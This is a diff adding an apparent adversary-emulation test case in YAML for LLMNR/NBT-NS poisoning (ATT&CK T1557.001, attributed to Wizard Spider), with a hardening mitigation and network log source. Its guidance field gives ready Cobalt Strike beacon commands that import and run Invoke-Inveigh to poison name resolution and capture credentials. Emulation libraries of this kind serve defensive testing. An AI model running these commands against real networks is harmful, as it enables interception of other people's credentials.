@@ -1,0 +1,31 @@
+block:
+- Disable LLMNR/NTB-NS via registry/GPO configurations
+controls:
+- Hardening
+description: Poison LLMNR/NBT-NS traffic using the PowerShell script Inveigh in a
+  Cobalt Strike beacon. Inveigh can be used by a low-privilege user but its functionality
+  will be limited compared to when run as a high-privilege (local administrator) user.
+detect:
+- null
+guidance:
+- beacon> powershell-import {{ inveigh_script_path }}
+- "beacon> powershell Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP N -ConsoleOutput Y -RunTime\
+  \ 10 -StartupChecks N\n(or) \nbeacon> powerpick Invoke-Inveigh -LLMNR Y -NBNS Y\
+  \ -HTTP N -ConsoleOutput Y -RunTime 10 -StartupChecks N\n"
+logs:
+- network
+metadata:
+  groups:
+  - Wizard Spider
+  isv: 1
+  tactic: TA0006
+  tid: T1557.001
+  x_tool_links:
+  - https://github.com/Kevin-Robertson/Inveigh
+  x_tools:
+  - Cobalt Strike
+name: LLMNR/NBT-NS Poisoning via Invoke-Inveigh in Beacon
+platforms:
+- windows
+prerequisites:
+- local_admin
